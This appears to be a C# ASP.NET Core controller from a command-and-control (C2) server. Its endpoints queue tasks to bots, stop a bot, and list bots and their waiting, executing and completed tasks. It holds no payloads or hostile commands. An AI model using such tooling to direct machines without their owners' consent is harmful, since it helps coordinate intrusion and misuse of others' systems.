using C2.Models;
using C2.POCOs;
using Microsoft.AspNetCore.Cors;
using Microsoft.AspNetCore.Mvc;
using System.Collections.Concurrent;

namespace C2.Controllers;

[ApiController]
[Route("[controller]")]
public class ManagementController : AbstractController
{
    [HttpGet("ManagementTest")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public IActionResult ManagementTest() => Ok();

    [HttpPost("QueueTask")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public IActionResult QueueTask([FromBody] AddedBotTask task)
    {
        for (int i = 0; i < task.Count; i++)
        {
            C2State.TaskManager.QueueBotTask(task.Task, task.TaskParameters);
        }

        return Ok();
    }

    [HttpGet("StopBot")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public IActionResult StopBot([FromQuery] int bot_id)
    {
        BotClient bot = GetBot(bot_id);

        bot.StopRequested = true;

        return Ok();
    }

    [HttpGet("GetBotInfo")]
    [ProducesResponseType(typeof(BotInfoPoco), StatusCodes.Status200OK)]
    public IActionResult GetBotInfo([FromQuery] int bot_id)
    {
        BotClient bot = GetBot(bot_id);

        var BotInfo = new BotInfoPoco()
        {
            Bot = bot,
            Task = C2State.TaskManager.GetTask(bot.TaskId)
        };

        return Ok(BotInfo);
    }

    [HttpGet("GetBotManager")]
    [ProducesResponseType(typeof(BotManager), StatusCodes.Status200OK)]
    public IActionResult GetBotManager() => Ok(C2State.BotManager.Bots);

    [HttpGet("GetBots")]
    [ProducesResponseType(typeof(StrippedBotList), StatusCodes.Status200OK)]
    public IActionResult GetBots()
    {
        var bots = new StrippedBotList();
        foreach (var bot in C2State.BotManager.Bots.Values)
        {
            bots.Bots.Add(new StrippedBot() { Id = bot.Id, Name = bot.Name });
        }

        return Ok(bots);
    }

    [HttpGet("GetWaitingTasks")]
    [ProducesResponseType(typeof(ConcurrentQueue<BotTask>), StatusCodes.Status200OK)]
    public IActionResult GetWaitingTasks() => Ok(C2State.TaskManager.Waiting);

    [HttpGet("GetExecutingTasks")]
    [ProducesResponseType(typeof(ConcurrentDictionary<int, BotTask>), StatusCodes.Status200OK)]
    public IActionResult GetExecutingTasks() => Ok(C2State.TaskManager.Executing);

    [HttpGet("GetCompletedTasks")]
    [ProducesResponseType(typeof(ConcurrentBag<BotTask>), StatusCodes.Status200OK)]
    public IActionResult GetCompletedTasks() => Ok(C2State.TaskManager.Completed);

}
